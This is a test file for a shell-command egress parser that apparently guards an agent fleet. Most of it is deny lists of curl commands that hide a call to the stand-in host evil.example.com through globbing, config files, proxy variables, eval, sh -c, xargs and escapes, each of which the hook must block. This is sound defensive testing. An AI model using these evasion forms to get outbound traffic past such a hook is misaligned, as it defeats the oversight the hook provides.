// Card d6b95892 (didi 35993 on c8b1ccbf @ed994975e): curl destinations the parser did not read, and
// passed. Principle (marveen 30090): what the parser cannot read, it denies.
// 1. curl's own URL globbing ({a,b}, [n-m]) in the host part: the host is a set, not read.
// 2. -K / --config: url / proxy lines the argv never shows.
// 3. shell expansion the assignment reading does not take ($1, $@, arrays, +=, read, set -A, ...).
// Round 3 (didi 36034): every glued head form, a computed variable name, `unset` stays allowed.
// Round 5 (didi 36152): eval -- / builtin eval / eval $'...', BSD xargs -J, env -- {}, a command
// xargs reads from stdin, a substitution's output as an assignment; found on the way: a $'curl' or
// $X command word, builtin command curl.
// Round 8 (didi 36603): eval and sh -c bodies with their substitutions kept, sh -c positionals bound
// to the words after the body, $0 reaching an xargs body's command word through a variable or a
// substitution, and the backslash of a double-quoted body (`\x5f` stays for the inner shell).
// Round 9 (didi 36796): an escaped \$ in a double-quoted -c / eval body (lifting blanked it), the
// line before an eval / sh -c body as the place its command word is set, and an xargs body's $0
// bound through read / printf -v / for.
// Round 2 (didi 36014): slashes after the scheme, a glued f()( body, a proxy variable.
// Found on the way (dexter): a function body (`f(){ curl ...; }; f`) and a subshell's closing `)`
// glued to the URL (`(curl -s http://evil.example.com)`) both passed the running gate.
// Every PASS row is a fleet shape the fix must keep green (measured on 21 086 fleet commands).
import { describe, it, expect } from 'vitest'
// @ts-expect-error -- plain .mjs hook script, no types
import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'

const EV = 'evil.example.com'

const mustDeny: Array<[string, string]> = [
  // 1. curl URL globbing in the host part
  ['glob set, quoted', `curl -s "http://{${EV},${EV}}/x"`],
  ['glob range', 'curl -s "http://evil[1-1].example.com/x"'],
  ['glob set, local first', `curl -s "http://{localhost,${EV}}/x"`],
  ['glob set around the scheme', `curl -s "{http://${EV}/x,http://localhost/}"`],
  ['glob set in the userinfo', `curl -s "http://{u@,}${EV}/x"`],
  ['glob set after a local name', `curl -s "http://localhost{,.${EV}}/x"`],
  ['-g does not make a set readable', `curl -g -s "http://{localhost,${EV}}/x"`],
  ['--url with a glob', `curl --url "http://{localhost,${EV}}/x"`],
  ['-x proxy with a glob', `curl -x "http://{a,${EV}}:8080" http://localhost:3420/`],
  // 2. -K / --config
  ['-K - from a heredoc', `curl -s -K - <<'S'\nurl = "https://${EV}/x"\nS`],
  ['-K file', 'curl -K /tmp/c.cfg'],
  ['-K - from a decoded pipe', 'echo dXJs | base64 -d | curl -K -'],
  ['--config=file', 'curl --config=/tmp/c.cfg http://localhost:3420/'],
  ['-sK cluster', 'curl -sK /tmp/c.cfg'],
  ['--config file', 'curl --config /tmp/c.cfg'],
  ['a ~/.curlrc written on the line', `printf 'url = "https://${EV}/x"\\n' > ~/.curlrc; curl -s http://localhost:3420/`],
  // 3. shell expansion in the host part
  ['$1 from set --', `set -- ${EV}; curl -s "https://$1/x"`],
  ['$@ from set --', `set -- ${EV}; curl -s "https://$@/x"`],
  ['array as $a', `a=(${EV}); curl -s "https://$a/x"`],
  ['unquoted brace expansion', `curl -s http://{localhost,${EV}}/x`],
  ['a function argument', `f(){ curl -s "https://$1/x"; }; f ${EV}`],
  ['+= append', `h+=${EV}; curl -s "https://$h/x"`],
  ['h[0]= element', `h[0]=${EV}; curl -s "https://$h/x"`],
  ['declare -a', `declare -a h=(${EV}); curl -s "https://$h/x"`],
  ['zsh $^a', `a=(${EV}); curl -s "https://$^a/x"`],
  ['ANSI-C escape', `curl -s $'https://evil\\x2eexample.com/x'`],
  ['read from a here-string', `read h <<< ${EV}; curl -s "https://$h/x"`],
  ['set -A', `set -A h ${EV}; curl -s "https://$h/x"`],
  ['typeset', `typeset h=${EV}; curl -s "https://$h/x"`],
  ['read from a file', 'read -r u < f; curl -s "$u"'],
  ['a loop reading a file', 'while read u; do curl -s "$u"; done < urls.txt'],
  ['a loop reading a process substitution', 'while read u; do curl -s "$u"; done < <(echo https://example.org/x)'],
  ['a fed read and a file read of one name', 'read u <<< "http://localhost:3420/"; read u < f; curl -s "$u"'],
  // function bodies
  ['f(){ ... }', `f(){ curl -s https://${EV}/x; }; f`],
  ['f() { ... }', `f() { curl -s https://${EV}/x; }; f`],
  ['zsh f () { ... }', `f () { curl -s https://${EV}/x; }; f`],
  ['function f { ... }', `function f { curl -s https://${EV}/x; }; f`],
  ['function f() { ... }', `function f() { curl -s https://${EV}/x; }; f`],
  ['f() ( ... )', `f() (curl -s https://${EV}/x); f`],
  // arrays holding a destination
  ['array holding the URL', `U=(https://${EV}/x); curl -s "\${U[@]}"`],
  ['array as plain $U', `U=(-s https://${EV}/x); curl $U`],
  ['array written twice', `H=(-H a); H+=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
  ['array assigned twice', `H=(-H a); H=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
  ['array never assigned', 'curl -s "${Z[@]}" http://localhost:3420/'],
  ['array holding -x', `H=(-x https://${EV}); curl "\${H[@]}" http://localhost:3420/`],
  // a subshell's `)` glued to the URL
  ['subshell, scheme URL', `(curl -s http://${EV})`],
  ['subshell, bare host', `(curl -s ${EV})`],
  ['subshell among others', `x=1; (curl -s -o /dev/null http://${EV}); echo`],
  // round 2 (didi 36014)
  ['three slashes after the scheme', `curl -s http:///${EV}/x`],
  ['one slash after the scheme', `curl -s "https:/${EV}/x"`],
  ['four slashes after the scheme', `curl -s http:////${EV}/x`],
  ['f()( ... ) glued', `f()(curl -s https://${EV}/x); f`],
  ['f()( ... ) glued, no space after ;', `f()(curl -s https://${EV}/x);f`],
  ['http_proxy prefix', `http_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['export HTTPS_PROXY', `export HTTPS_PROXY=http://${EV}:8080; curl -s https://localhost:3420/`],
  ['env ALL_PROXY', `env ALL_PROXY=socks5://${EV} curl -s http://localhost:3420/`],
  ['a quoted proxy name', `export "https_pro"xy=http://${EV}; curl -s https://localhost:3420/`],
  // round 3 (didi 36034): every glued function head, and a computed variable name
  ['f()( curl, space after the opener', `f()( curl -s https://${EV}/x); f`],
  ['f()(command curl', `f()(command curl -s https://${EV}/x); f`],
  ['function f()(curl', `function f()(curl -s https://${EV}/x); f`],
  ['nested glued heads', `f()(g()(curl -s https://${EV}/x); g); f`],
  ['f ()(curl', `f ()(curl -s https://${EV}/x); f`],
  ['(command curl', `(command curl -s https://${EV}/x)`],
  ['export ${v}proxy=', `v=http_; export \${v}proxy=http://${EV}:1; curl -s http://localhost:3420/`],
  ['env ${v}proxy= curl', `v=http_; env \${v}proxy=http://${EV}:1 curl -s http://localhost:3420/`],
  ['declare -x "${p}="', `declare -x "\${p}=http://${EV}"; curl -s http://localhost:3420/`],
  ['printf -v a computed name', `printf -v "\${v}proxy" %s http://${EV}; export \${v}proxy; curl -s http://localhost:3420/`],
  // round 4 (didi 36059): an unset ends at its newline; the computed-name class remainders
  ['unset, newline, proxy prefix', `unset x\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['unset, newline, export proxy', `unset x\nexport http_proxy=http://${EV}:8080\ncurl -s http://localhost:3420/`],
  ['env -u, newline, proxy prefix', `env -u x\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['env -u with its name on the next line', `env -u\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['env --unset with its name on the next line', `env --unset\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['an eval that only assigns, a local curl after it', `v=http_; eval "\${v}proxy=http://${EV}:1"; curl -s http://localhost:3420/`],
  ['a brace-expanded export name', `export http_{proxy,x}=http://${EV}:1; curl -s http://localhost:3420/`],
  ['export -- a computed name', `v=http_; export -- \${v}proxy=http://${EV}:1; curl -s http://localhost:3420/`],
  ['eval of a computed assignment', `v=http_; eval "\${v}proxy=http://${EV}:1 curl -s http://localhost:3420/"`],
  ['a backtick in the name', `export \`printf http_\`proxy=http://${EV}:1; curl -s http://localhost:3420/`],
  ['a $( ) in the name', `export $(printf http_)proxy=http://${EV}:1; curl -s http://localhost:3420/`],
  ['xargs env {}', `echo "\${v}proxy=http://${EV}:1" | xargs -I{} env {} curl -s http://localhost:3420/`],
  ['xargs env with its own replace string', 'echo a | xargs -I X env X curl -s http://localhost:3420/'],
  ['eval of a quoted external curl', `eval "curl -s https://${EV}/x"`],
  ['eval of bare external curl words', `eval curl -s https://${EV}/x`],
  // round 5 (didi 36152); stdin comes from an outside variable, so no external host is in the text
  ['eval --', `eval -- curl -s https://${EV}/x`],
  ['builtin eval', `builtin eval curl -s https://${EV}/x`],
  ['eval of an ANSI-C quoted line', `eval $'curl -s https://${EV}/x'`],
  ['an ANSI-C quoted command word', `$'curl' -s https://${EV}/x`],
  ['eval of an ANSI-C line with a newline', `eval $'echo hi\\ncurl -s https://${EV}/x'`],
  ['an ANSI-C escape in the command word', `$'\\x63url' -s https://${EV}/x`],
  ['builtin command curl', `builtin command curl -s https://${EV}/x`],
  ['BSD xargs -J into env', 'echo "$P" | xargs -J % env % curl -s http://localhost:3420/'],
  ['xargs env -- {}', 'echo "$P" | xargs -I{} env -- {} curl -s http://localhost:3420/'],
  ['xargs env, the command from stdin', 'echo "$C" | xargs env'],
  ['xargs nohup, the command from stdin', 'echo "$C" | xargs -0 nohup'],
  ['xargs, the replace string as the command', 'echo "$C" | xargs -I{} {} http://localhost:3420/'],
  ['export of a substitution', `v=http_; export $(echo \${v}proxy=http://${EV}:1); curl -s http://localhost:3420/`],
  ['env of a substitution', 'env $(cat /tmp/p.env) curl -s http://localhost:3420/'],
  ['export of a file', 'export $(cat /tmp/p.env); curl -s http://localhost:3420/'],
  ['export of a variable', 'export $P; curl -s http://localhost:3420/'],
  ['an assigned command variable', `X=curl; $X https://${EV}/`],
  ['a computed export in a bash heredoc', `bash <<'EOF'\nv=http_; export $(echo \${v}proxy=http://${EV}:1); curl -s http://localhost:3420/\nEOF`],
  // the array a lifted rest inherits is read in full, an external word in it still denies
  ['an array URL after an unclosed backtick', `U=(https://${EV}/x); python3 -c "print('\`')"\ncurl -s "\${U[@]}"`],
  ['an array written in the lifted rest too', `H=(-H a); python3 -c "print('\`')"\nH+=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
]

const mustPass: Array<[string, string]> = [
  ['glob in the query', 'curl -s "http://localhost:3420/api/x?f={a,b}&r=[1-2]"'],
  ['glob in the path', 'curl -s "http://localhost:3420/api/{a,b}"'],
  ['bracketed IPv6 literal', 'curl -s "http://[::1]:3420/api"'],
  ['a local curl in a function', 'f(){ curl -s http://localhost:3420/api/kanban; }; f'],
  ['the fleet header array', 'T=x; H=(-H "Authorization: Bearer $T" -H "Content-Type: application/json"); curl -s -X POST "${H[@]}" http://localhost:3420/api/kanban'],
  ['an outside variable', 'curl -s "$DASH/api"'],
  ['an outside variable as host', 'curl -s "http://$HOSTX:3420/api"'],
  ['a local literal', 'curl -s http://localhost:3420/api/kanban'],
  ['an assigned local host', 'h=localhost; curl -s "http://$h:3420/api"'],
  ['$1 in the path', 'curl -s "http://localhost:3420/api/$1"'],
  // a read fed by the line's own here-string / heredoc is read, not unread (its values are judged)
  ['a loop over a local here-string', 'while read u; do curl -s "$u"; done <<< "http://localhost:3420/x"'],
  ['a read of a local here-string', 'read u <<< "http://localhost:3420/x"; curl -s "$u"'],
  ['a loop over a local heredoc', 'while read u; do curl -s "$u"; done <<EOF\nhttp://localhost:3420/a\nEOF'],
  // corpus: mandark's health checks in a subshell
  ['subshell, local health checks', '(curl -s -o /dev/null -w "%{http_code} " localhost:4230/api/v1/health; curl -s -o /dev/null -w "%{http_code}\\n" localhost:5230)'],
  ['subshell, quoted local URL', '(curl -s "http://localhost:3420/api")'],
  ['a file URL', 'curl -s file:///tmp/x.json'],
  ['no_proxy only narrows', 'NO_PROXY=localhost curl -s http://localhost:3420/api'],
  ['unset of the proxy variables', 'unset http_proxy https_proxy; curl -s http://localhost:3420/api'],
  ['env -u a proxy variable', 'env -u http_proxy curl -s http://localhost:3420/api'],
  ['unset then a local curl on the next line', 'unset x y\ncurl -s http://localhost:3420/api'],
  ['an export with a computed value only', 'export T=$(cat /tmp/t); curl -s http://localhost:3420/api'],
  ['an export with a backtick value', 'export T=`cat /tmp/t`; curl -s http://localhost:3420/api'],
  ['eval of a local curl', 'eval "curl -s http://localhost:3420/api"'],
  ['eval of an ssh-agent', 'eval "$(ssh-agent -s)"'],
  ['xargs replace in the URL path', 'echo a | xargs -I{} curl -s http://localhost:3420/{}'],
  ['an export with a plain name and a computed value', 'export PATH="$HOME/bin:$PATH"; curl -s http://localhost:3420/api'],
  ['f () { ... } local', 'f () { curl -s http://localhost:3420/api; }; f'],
  // round 5: the replace string in the command's own arguments names no variable (didi 36152 item 4)
  ['xargs env FOO=1, the replace string in the URL', 'echo api | xargs -I{} env FOO=1 curl -s http://localhost:3420/{}'],
  ['bare xargs (its echo)', 'echo a b | xargs'],
  ['xargs -I{} rm {}', 'find . -name x | xargs -I{} rm {}'],
  ['eval of an ANSI-C quoted local curl', "eval $'curl -s http://localhost:3420/api'"],
  ['ANSI-C quoting outside a curl', "printf $'a\\tb\\n'"],
  ['an assigned command variable, local', 'X=curl; $X -s http://localhost:3420/api'],
  // fleet replay: an eval / export quoted in a message heredoc is text, not this shell's words
  ['eval and export in a message heredoc', 'cat <<\'EOF\' > m.txt\neval "$(cat <<X)" and export $(y)\nEOF\ncurl -s http://localhost:3420/api'],
  // fleet replay (ford): an unclosed backtick lifts the rest of the line; the array written before it holds
  ['the header array before an unclosed backtick', 'H=(-H "A: b"); curl -s "${H[@]}" http://localhost:3420/x | python3 -c "print(\'`\' in \'x\')"\ncurl -s "${H[@]}" http://localhost:3420/y'],
]

describe('card d6b95892: curl destinations the parser cannot read are denied', () => {
  it.each(mustDeny)('denies %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true })
  })
  it.each(mustPass)('passes %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
  // The named destination tells the agent what was not read: each rule's own marker.
  it.each([
    ['a glob', `curl -s "http://{localhost,${EV}}/x"`, `<unreadable host: http://{localhost,${EV}}/x>`],
    ['a config file', 'curl -K /tmp/c.cfg', '<curl config: /tmp/c.cfg>'],
    ['a positional', `set -- ${EV}; curl -s "https://$1/x"`, '<unreadable host: https://$1/x>'],
    ['a name written unread', `h+=${EV}; curl -s "https://$h/x"`, '$h'],
    ['an unknown array', 'curl -s "${Z[@]}" http://localhost:3420/', '<unreadable host: ${Z[@]}>'],
    ['a curlrc', `printf 'url = "https://${EV}/x"\\n' > ~/.curlrc; curl -s http://localhost:3420/`, '<curlrc>'],
    ['a proxy variable', `http_proxy=http://${EV}:8080 curl -s http://localhost:3420/`, '<proxy variable>'],
    ['a computed variable name', `v=http_; env \${v}proxy=http://${EV}:1 curl -s http://localhost:3420/`, '<computed variable name>'],
  ])('names %s', (_name, cmd, host) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: [host] })
  })
  it.each([
    ['an array read in full', `U=(https://${EV}/x); curl -s "\${U[@]}"`],
    ['a function body', `f(){ curl -s https://${EV}/x; }; f`],
    ['a subshell', `(curl -s http://${EV})`],
    ['three slashes', `curl -s http:///${EV}/x`],
    ['a glued function body', `f()(curl -s https://${EV}/x); f`],
    ['a fed read', `while read u; do curl -s "$u"; done <<< "https://${EV}/"`],
  ])('reads the host of %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: [EV] })
  })
  // round 5: the replace string in front of env's command is an assignment, so the real target
  // is read and named, not only an unread stdin command
  it.each([
    ['BSD xargs -J into env', `echo "$P" | xargs -J % env % curl -s https://${EV}/x`],
    ['xargs env -- {}', `echo "$P" | xargs -I{} env -- {} curl -s https://${EV}/x`],
  ])('reads the curl target behind %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-external', hosts: [EV] })
  })
  it('reads the host of an eval body, under its own reason', () => {
    const cmd = `eval "curl -s https://${EV}/x"`
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'eval-curl-external', hosts: [EV] })
  })
})

// Round 6 (didi 36220 on 69db22145): a shell under xargs whose command line is stdin, a command word
// the line cannot read, and the computed-name rule read only where a declarer is the command.
describe('card d6b95892 round 6', () => {
  const FEED = `echo "curl -s https://${EV}/x"`
  it.each([
    ['S1 xargs -0 sh -c (stdin is the body)', `${FEED} | xargs -0 sh -c`],
    ['xargs -0 bash -lc', `${FEED} | xargs -0 bash -lc`],
    ['S2 xargs -I{} sh -c {}', `${FEED} | xargs -I{} sh -c {}`],
    ['S3 xargs -I{} bash -c "{}"', `${FEED} | xargs -I{} bash -c "{}"`],
    ['eval of the replace string', `${FEED} | xargs -I{} sh -c 'eval {}'`],
    ['a positional as the command', `${FEED} | xargs sh -c '"$@"' _`],
    ['a nested -c body', `${FEED} | xargs -I% sh -c 'bash -c %'`],
  ])('denies %s as a command from stdin', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-stdin-command', hosts: ['<command from stdin>'] })
  })
  it.each([
    ['S6 a substitution', `X=$(echo curl); $X -s https://${EV}/x`],
    ['a backtick substitution', 'X=`echo curl`; $X -s https://' + EV + '/x'],
    ['S7 a positional', `set -- curl; $1 -s https://${EV}/x`],
    ['a positional in a function body', `f(){ $1 -s "$2"; }; f curl https://${EV}/x`],
    ['S13 an array holding the line', `a=(curl -s https://${EV}/x); "\${a[@]}"`],
    ['an array holding the tool', `a=(curl -s); "\${a[@]}" https://${EV}/x`],
  ])('denies %s as the command word', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unread-command-word', hosts: [EV] })
  })
  it.each([
    ['O20 eval of ssh-agent', 'eval "$(ssh-agent -s)"; curl -s http://localhost:3420/'],
    ['O21 eval of brew shellenv', 'eval "$(brew shellenv)"; curl -s http://localhost:3420/'],
    ['O22 "env $HOME" in a -d payload', `curl -s -d '{"content":"the env $HOME check"}' http://localhost:3420/`],
    ['O23 "local ${N}" in a -d payload', 'curl -s -d "keep local ${N} rows" http://localhost:3420/'],
    ['O30 "env $X" in a commit message', 'git commit -m "use env $X"; curl -s http://localhost:3420/'],
    ['xargs passing the replace string as an argument', `find . -name '*.ts' | xargs -I{} sh -c 'wc -l {}'`],
    ['a quoted \\| in an xargs body', `ls | xargs -I{} sh -c 'echo {}; grep -n "a\\|http\\|{{" {} | head'`],
    ['xargs -0 sh -c printing its arguments', `printf 'a\\0' | xargs -0 sh -c 'echo "$@"' _`],
    ['an unread command word with no network tool before it', `X=$(which python3); $X s.py; curl -s http://localhost:3420/ -d '{"u":"https://github.com/a"}'`],
    ['an inherited command word', '$EDITOR notes.md'],
    ['an assigned curl to a local host', `C=curl; $C -s http://localhost:3420/ -d '{"u":"https://github.com/a"}'`],
    // ford's fleet line, shrunk: an unclosed backtick in a python -c string makes a later word look
    // like `{...}=` in assignment position
    ['an unclosed backtick in a python -c string (fleet replay)', "TOKEN=\"$(cat /Users/isti/marveen/store/.dashboard-token)\"; H=(-H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\")\ncurl -s \"${H[@]}\" http://localhost:3420/api/kanban/ae1b3293/comments | python3 -c \"import sys,json; c=json.load(sys.stdin)[-1]; print(c['author'], '`'\ncurl -s \"${H[@]}\" http://localhost:3420/api/kanban | python3 -c \"import sys,json; d=j"],
  ])('passes %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
  it.each([
    ['env of a substitution', 'env $(cat f) curl -s http://localhost:3420/'],
    ['export of a variable', 'export $v; curl -s http://localhost:3420/'],
    ['export of a substitution', `v=http_; export $(echo \${v}proxy=http://${EV}:1); curl -s http://localhost:3420/`],
    ['a declarer inside an eval line', `eval "export \${v}proxy=http://${EV}:1"; curl -s http://localhost:3420/`],
    ['a declarer in a loop body', 'for v in a; do export $v; done; curl -s http://localhost:3420/'],
    ['env behind a prefix command', 'nohup env $(cat f) curl -s http://localhost:3420/'],
    ['printf -v', 'printf -v "$n" %s http://x; curl -s http://localhost:3420/'],
  ])('still names a computed variable name: %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, hosts: ['<computed variable name>'] })
  })
})

describe('card d6b95892 round 7', () => {
  it.each([
    ['export of an ANSI-C built proxy name', `export http$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/`],
    ['declare -x of an ANSI-C built proxy name', `declare -x http$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/`],
    ['env of an ANSI-C built proxy name', `env http$'\\x5f'proxy=http://${EV}:1 curl -s http://localhost:3420/`],
  ])('denies %s (a regression of round 6)', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, hosts: ['<proxy variable>'] })
  })
  it('denies T4 xargs sh -c running $0 as the command', () => {
    const cmd = `echo "curl -s https://${EV}/x" | xargs sh -c '$0 "$@"'`
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-stdin-command' })
  })
  it.each([
    ['T17 a $( ) substitution', `$(echo curl) -s https://${EV}/x`],
    ['T18 a backtick substitution', '`echo curl` -s https://' + EV + '/x'],
    ['a quoted substitution after another command', `cd /tmp; "$(echo curl)" -s https://${EV}/x`],
  ])('denies %s as the command word', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unread-command-word', hosts: [EV] })
  })
  it('denies T21 a substitution as the command word of a sh -c body', () => {
    const cmd = `sh -c "$(echo curl) -s https://${EV}/x"`
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'shell-c-unread-command-word', hosts: [EV] })
  })
  it.each([
    ['a substitution command word to a local host', '$(echo curl) -s http://localhost:3420/'],
    ['a substitution path prefix with no network tool', '$(git rev-parse --show-toplevel)/scripts/x.sh a b'],
    ['a sh -c body with a substitution argument', `sh -c "echo $(date); curl -s http://localhost:3420/"`],
  ])('passes %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
})

describe('card d6b95892 round 8 (didi 36603)', () => {
  it.each([
    ['1. eval of a $( ) command word', `eval "$(echo curl) https://${EV}/x"`, 'eval-unread-command-word'],
    ['1. eval of a backtick command word', 'eval "`echo curl` https://' + EV + '/x"', 'eval-unread-command-word'],
    ['1. eval of $(which curl)', `eval "$(which curl) https://${EV}/x"`, 'eval-unread-command-word'],
    ['1. eval inside a sh -c body', `sh -c 'eval "$(echo curl) https://${EV}/x"'`, 'shell-c-eval-unread-command-word'],
    ['1. eval in a subshell', `( eval "$(echo curl) https://${EV}/x" )`, 'eval-unread-command-word'],
    ['3. sh -c positional after a substitution', `sh -c "$(echo curl) \\$1" _ https://${EV}/x`, 'shell-c-unread-command-word'],
    ['3. sh -c positional as the command word', `sh -c '$1 -s https://${EV}/x' _ curl`, 'shell-c-curl-external'],
  ])('denies %s', (_name, cmd, reason) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason, hosts: [EV] })
  })
  it.each([
    ['2. $0 in a substitution', `echo curl | xargs sh -c '$(echo $0) -s https://${EV}/x'`],
    ['2. $0 assigned to a variable', `echo curl | xargs sh -c 'x=$0; $x -s https://${EV}/x'`],
    ['2. $0 assigned, double-quoted', `echo curl | xargs sh -c 'x="$0"; $x -s https://${EV}/x'`],
    ['2. $0 assigned through two names', `echo curl | xargs sh -c 'x=$0; y=$x; $y -s https://${EV}/x'`],
    ['2. $1 assigned under -I{}', `echo curl | xargs -I{} sh -c 'x=$1; $x -s https://${EV}/x' _ {}`],
    ['2. $* assigned', `echo "curl -s https://${EV}/x" | xargs sh -c 'x="$*"; $x' _`],
    ['2. $0 assigned, run by eval', `echo curl | xargs bash -c 'c=$0; eval "$c -s https://${EV}/x"'`],
  ])('denies xargs running what it hands the body: %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-stdin-command' })
  })
  it.each([
    ['4. sh -c, double-quoted body', `sh -c "export http$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/"`],
    ['4. bash -c, double-quoted body', `bash -c "export http$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/"`],
    ['F06 eval of a quote-split ANSI-C name', `eval 'export http$'"'"'\\x5f'"'"'proxy=http://${EV}:1'; curl -s http://localhost:3420/`],
  ])('denies an ANSI-C built proxy name: %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, hosts: ['<proxy variable>'] })
  })
  it.each([
    ['xargs body passing $0 as an argument', `find . | xargs sh -c 'wc -l "$0"'`],
    ['xargs body assigning $0, literal command word', `find . | xargs sh -c 'f=$0; wc -l "$f"'`],
    ['xargs body with $0 in an argument substitution', `find . | xargs sh -c 'n=$(basename $0); echo $n'`],
    ['sh -c positional URL only printed', `sh -c 'echo "$1"' _ https://${EV}/x`],
    ['sh -c positional file argument', `sh -c 'wc -l "$1"' _ notes.md`],
    ['eval of a local-only substitution', 'eval "$(ssh-agent -s)"'],
    ['a double-quoted body keeps an escaped dollar', `sh -c "echo \\$HOME; curl -s http://localhost:3420/"`],
  ])('passes %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
})

describe('card d6b95892 round 9 (didi 36796)', () => {
  it.each([
    ['dq body, escaped $1 bound to curl', `sh -c "\\$1 -s https://${EV}/x" _ curl`, 'shell-c-unread-command-word'],
    ['dq body, escaped $0 bound to curl', `sh -c "\\$0 -s https://${EV}/x" curl`, 'shell-c-unread-command-word'],
    ['dq body, escaped $c set in the body', `sh -c "c=curl; \\$c -s https://${EV}/x"`, 'shell-c-curl-external'],
    ['eval of a variable set from a substitution', `x=$(echo curl); eval "$x -s https://${EV}/x"`, 'eval-unread-command-word'],
    ['the whole command in one positional', `sh -c '$1' _ "curl -s https://${EV}/x"`, 'shell-c-unread-command-word'],
  ])('denies %s', (_name, cmd, reason) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason, hosts: [EV] })
  })
  it.each([
    ['dq body, escaped $0', `echo curl | xargs sh -c "\\$0 -s https://${EV}/x"`],
    ['dq body, escaped $0 assigned', `echo curl | xargs sh -c "x=\\$0; \\$x -s https://${EV}/x"`],
    ['$0 bound by read', `echo curl | xargs bash -c 'read x <<< "$0"; $x -s https://${EV}/x'`],
    ['$0 bound by printf -v', `echo curl | xargs bash -c 'printf -v x %s "$0"; $x -s https://${EV}/x'`],
    ['$0 bound by for', `echo curl | xargs sh -c 'for t in $0; do $t -s https://${EV}/x; done'`],
  ])('denies xargs running what it hands the body: %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-stdin-command' })
  })
  it('denies a dq body building the proxy name around an escaped $', () => {
    const cmd = `sh -c "export http\\$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/"`
    expect(classify(cmd), cmd).toMatchObject({ deny: true, hosts: ['<proxy variable>'] })
  })
  it.each([
    ['xargs body reading $0 into a file argument', `find . | xargs sh -c 'read x <<< "$0"; wc -l "$x"'`],
    ['a positional with spaces only printed', `sh -c 'echo $1' _ "a b"`],
    ['a whole local command in one positional', `sh -c '$1' _ "ls -la"`],
    ['eval printing a substitution', `x=$(date); eval "echo $x"`],
    ['dq body with escaped $HOME', `sh -c "echo \\$HOME" > /dev/null`],
    ['dq body, escaped $1 bound to a local command', `bash -c "wc -l \\$1" _ notes.md`],
  ])('passes %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
})
